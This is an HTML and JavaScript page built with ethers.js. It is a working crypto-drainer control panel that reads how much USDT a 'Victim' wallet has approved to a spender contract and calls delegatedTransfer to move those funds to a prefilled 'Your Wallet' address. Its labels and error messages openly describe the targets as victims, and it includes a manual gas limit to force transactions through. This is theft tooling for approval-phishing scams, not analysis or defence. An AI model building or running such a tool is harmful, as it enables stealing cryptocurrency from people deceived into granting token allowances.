<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>BEP-20 Allowance & Withdraw</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: sans-serif; padding: 1.5rem; background: #f5f5f5; }
    .container { max-width: 500px; margin: auto; background: white; border-radius: 10px; padding: 2rem; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
    h2 { text-align: center; }
    label { display: block; margin-bottom: 5px; font-weight: bold; }
    input { width: 100%; padding: 0.7rem; margin-bottom: 1rem; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
    button { padding: 0.7rem 1.2rem; font-size: 1rem; border: none; border-radius: 6px; cursor: pointer; flex: 1; }
    .btn-row { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 1rem; }
    #output { margin-top: 1.5rem; font-weight: bold; text-align: center; white-space: pre-wrap; padding: 1rem; border-radius: 6px; }
    .status-info { background: #e3f2fd; color: #0d47a1; margin-bottom: 1rem; padding: 10px; border-radius: 6px; font-size: 0.9rem; }
    .status-error { background: #ffebee; color: #c62828; margin-top: 1rem; }
    .status-success { background: #e8f5e9; color: #2e7d32; margin-top: 1rem; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Token Allowance & Withdraw</h2>
    
    <div id="walletStatus" class="status-info">🔌 Wallet: Not connected</div>

    <label>USDT Contract Address:</label>
    <input type="text" id="tokenAddress" value="0x55d398326f99059ff775485246999027b3197955" />
    
    <label>Client/User Address (Victim):</label>
    <input id="fromAddress" placeholder="0x..." />
    
    <label>Recipient Address (Your Wallet):</label>
    <input type="text" id="toAddress" value="0x827F20106A28452FB889d583360C3790AB09b47F" />
    
    <label>Amount (USDT):</label>
    <input id="amount" type="number" placeholder="e.g. 10" step="any" />
    
    <label>Spender Contract Address:</label>
    <input type="text" id="contractAddress" value="0x65e8B2b53E9bd6d3C5CF68229602cba73Cd2dB1F" onchange="checkContractInfo()" />

    <div id="contractInfo" class="status-info" style="display:none;">⏳ Checking contract owner...</div>

    <div class="btn-row">
      <button onclick="checkAllowance()" style="background: #e0e0e0;">🔍 Check Allowance</button>
      <button onclick="withdraw()" style="background: #4CAF50; color: white;">💸 Withdraw</button>
    </div>

    <p id="output"></p>
  </div>

  <script>
    const contractABI = [
      "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)",
      "function owner() external view returns (address)"
    ];

    async function updateWalletStatus() {
      if (!window.ethereum) return;
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const accounts = await provider.listAccounts();
      const status = document.getElementById("walletStatus");
      if (accounts.length > 0) {
        status.innerText = `🔌 Connected: ${accounts[0].substring(0,6)}...${accounts[0].substring(38)}`;
      } else {
        status.innerText = "🔌 Wallet: Not connected";
      }
    }

    async function checkContractInfo() {
      const contractAddress = document.getElementById("contractAddress").value;
      const infoDiv = document.getElementById("contractInfo");
      if (!ethers.utils.isAddress(contractAddress)) return;

      infoDiv.style.display = "block";
      infoDiv.innerText = "⏳ Checking contract owner...";

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const contract = new ethers.Contract(contractAddress, contractABI, provider);
        const owner = await contract.owner();
        infoDiv.innerText = `👑 Contract Owner: ${owner}`;
        
        const accounts = await provider.listAccounts();
        if (accounts.length > 0 && accounts[0].toLowerCase() !== owner.toLowerCase()) {
          infoDiv.innerHTML += `<br/><span style="color:red;">⚠️ Warning: Your connected wallet is NOT the owner!</span>`;
        }
      } catch (err) {
        infoDiv.innerText = "❌ Error: Could not fetch contract owner. Check address or network.";
        console.error(err);
      }
    }

    async function checkAllowance() {
      const tokenAddress = document.getElementById("tokenAddress").value;
      const from = document.getElementById("fromAddress").value;
      const spender = document.getElementById("contractAddress").value;
      const output = document.getElementById("output");

      if (!from || !ethers.utils.isAddress(from)) {
        output.innerText = "❌ Please enter a valid user address.";
        output.className = "status-error";
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        await updateWalletStatus();
        
        const token = new ethers.Contract(tokenAddress, [
          "function allowance(address owner, address spender) external view returns (uint256)",
          "function balanceOf(address account) external view returns (uint256)"
        ], provider);

        const [allowance, balance] = await Promise.all([
          token.allowance(from, spender),
          token.balanceOf(from)
        ]);

        output.innerText = `✅ Allowance: ${ethers.utils.formatUnits(allowance, 18)} USDT\n💰 Balance: ${ethers.utils.formatUnits(balance, 18)} USDT`;
        output.className = "status-success";
      } catch (err) {
        output.innerText = "❌ Error checking allowance.";
        output.className = "status-error";
        console.error(err);
      }
    }

    async function withdraw() {
      const tokenAddress = document.getElementById("tokenAddress").value;
      const from = document.getElementById("fromAddress").value;
      const to = document.getElementById("toAddress").value;
      const amount = document.getElementById("amount").value;
      const contractAddress = document.getElementById("contractAddress").value;
      const output = document.getElementById("output");

      if (!amount || amount <= 0) {
        output.innerText = "❌ Please enter a valid amount.";
        output.className = "status-error";
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const contract = new ethers.Contract(contractAddress, contractABI, signer);

        output.innerText = "⏳ Initiating transaction...";
        output.className = "status-info";

        // Step 1: Check ownership manually before sending
        const owner = await contract.owner();
        const myAddress = await signer.getAddress();
        if (myAddress.toLowerCase() !== owner.toLowerCase()) {
          throw new Error(`Your wallet (${myAddress}) is not the owner of this contract. Only ${owner} can withdraw.`);
        }

        // Step 2: Check allowance manually
        const token = new ethers.Contract(tokenAddress, ["function allowance(address,address) view returns (uint256)"], provider);
        const allowance = await token.allowance(from, contractAddress);
        const amountParsed = ethers.utils.parseUnits(amount.toString(), 18);
        
        if (allowance.lt(amountParsed)) {
          throw new Error(`Insufficient allowance! Victim only approved ${ethers.utils.formatUnits(allowance, 18)} USDT.`);
        }

        // Step 3: Send with a manual gas limit if estimation fails
        const tx = await contract.delegatedTransfer(
          tokenAddress, 
          from, 
          to, 
          amountParsed,
          { gasLimit: 150000 } // Manual gas limit to bypass estimation failure
        );
        
        output.innerText = "⏳ Waiting for confirmation...";
        await tx.wait();
        output.innerText = "✅ Withdraw successful!";
        output.className = "status-success";
      } catch (err) {
        let errorMsg = err.reason || err.message || "Withdraw failed.";
        if (errorMsg.includes("UNPREDICTABLE_GAS_LIMIT")) {
          errorMsg = "❌ Transaction Reverted: Either you are not the owner, or the victim's allowance/balance is too low.";
        }
        output.innerText = errorMsg;
        output.className = "status-error";
        console.error(err);
      }
    }

    // Initialize info on load
    window.addEventListener('load', () => {
      updateWalletStatus();
      checkContractInfo();
    });
  </script>
</body>
</html>
